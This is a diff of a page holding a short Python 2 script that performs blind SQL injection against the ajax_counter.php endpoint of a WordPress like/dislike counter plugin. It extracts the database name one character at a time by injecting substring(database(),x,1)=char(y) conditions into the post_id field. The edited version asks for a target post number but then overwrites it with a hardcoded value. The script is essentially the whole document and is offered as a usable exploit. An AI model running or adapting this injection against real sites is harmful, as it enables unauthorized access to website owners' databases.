@@ -30,27 +30,30 @@
 
 ###### It's a python 
 <pre><code>
-    import requests  
-    import string  
-    
-    url = input("Input Target URL : ")
+   import requests
+   import string
 
-    if(url.startswith('http://') != 1) :
-            url = "http://" + url
+   url = input("Target Host : ")
 
-    dbName = []
+   if(url.startswith('http://') != 1) :
+      url = "http://"+url
 
-    for x in range(1,11) :
-            for y in range(32,127) :
-                    #print 'x = '+str(x)+'   y = '+str(y)
-                    brute_string = '12 and substring(database(),'+str(x)+',1) = char('+str(y)+')'
-                    payload = {'post_id' : brute_string, 'up_type' : 'like'}
-                    r = requests.post(url, data = payload)
-                    blindRes = int(r.content)
-    
-                    if blindRes :
-                            #print "The "+str(x)+"th word is : "+str(y)
-                            dbName.append(chr(y))
-                            break
-    print dbName
+   url = url + "/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php"
+
+   targetPostNum = input("Target Post Number : ")
+
+   dbName = ""
+   # url = "http://192.168.0.200/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php"
+   for x in range(1,11) :
+      for y in range(32,127) :
+         brute_string = targetPostNum + ' and substring(database(),'+str(x)+',1) = char('+str(y)+')'
+         brute_string = '6 and substring(database(),'+str(x)+',1) = char('+str(y)+')'
+         payload = {'post_id' : brute_string, 'up_type' : 'like'}
+         r = requests.post(url, data = payload)
+         blindRes = int(r.content)
+
+         if blindRes :
+            dbName = dbName+chr(y)
+            break
+   print "The DATABASE that target use is : " + dbName
 </code></pre>
